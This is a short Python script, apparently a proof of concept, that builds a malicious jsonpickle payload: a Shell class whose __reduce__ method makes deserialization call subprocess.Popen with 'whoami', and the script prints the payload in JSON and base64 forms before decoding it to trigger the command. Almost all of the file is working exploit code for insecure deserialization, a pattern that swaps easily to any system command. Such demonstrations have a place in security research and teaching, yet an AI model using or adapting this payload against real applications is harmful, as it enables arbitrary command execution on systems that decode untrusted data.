import subprocess
import jsonpickle
import pickle
import sys
import base64


class Shell(object):
    def __reduce__(self):
        return (subprocess.Popen, (('whoami'),))


class User(object):
    def __init__(self, user):
        self.user = user


def trace(frame, event):
    if event != 'call':
        return
    c_object = frame.f_code
    func_name = c_object.co_name
    func_name_line_no = frame.f_lineno
    func_filename = c_object.co_filename
    caller = frame.f_back
    caller_line_no = caller.f_lineno
    caller_filename = caller.f_code.co_filename
    print('Call to {0} on line {1} of {2} from line {3} of {4}'.format(func_name, func_name_line_no, func_filename,
                                                                       caller_line_no, caller_filename))
    return


def main():
    try:
        # Testing
        encoded = jsonpickle.encode((User("rotlogix")))
        print("[*] Test: {0}".format(encoded))
        # Create encoded Pickle from Shell()
        encoded = jsonpickle.encode(Shell())
        b64 = base64.b64encode(encoded)
        print("[*] Base64 Encoded: {0}".format(b64))
        print("[*] JSON encoded Pickle: {0}".format(encoded))
        print("[*] Reconstructing object from JSON Pickle ...")
        # Decode Pickle from JSON
        code = jsonpickle.decode(encoded)
        print("[*] Shellcode:\n {0}\n[*] Result ...".format(pickle.dumps(code)))
    except Exception as e:
        print("[!]")
        raise e

if __name__ == '__main__':
    try:
        # sys.settrace(trace)
        main()
    except KeyboardInterrupt:
        sys.exit(0)